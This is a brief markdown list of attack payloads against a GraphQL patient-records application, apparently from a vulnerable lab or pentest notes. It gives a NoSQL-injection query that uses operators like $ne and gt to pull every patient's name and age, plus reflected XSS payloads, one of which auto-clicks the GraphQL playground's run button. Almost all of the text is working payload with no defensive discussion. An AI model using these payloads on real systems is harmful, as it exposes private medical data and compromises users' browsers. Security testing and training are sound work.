

## Injection

NoSQL injection
  ```
  # query getPatient {
  #   patient(test: { $ne: \"0\"}"   {
  #     _id
  #     name
  #   }
  # }

  query getPatients {
    patients(
      search: "{ name: { gt: \"\"} }"
  ) {
      	_id
      name
      age
    }
  }
  ```

## XSS

Reflected XSS via URL
Trigger graphql playground query play button from url

<script>document.getElementsByClassName('sc-bwzfXH')[0].click()</script>




<script>alert('XSS')</script>
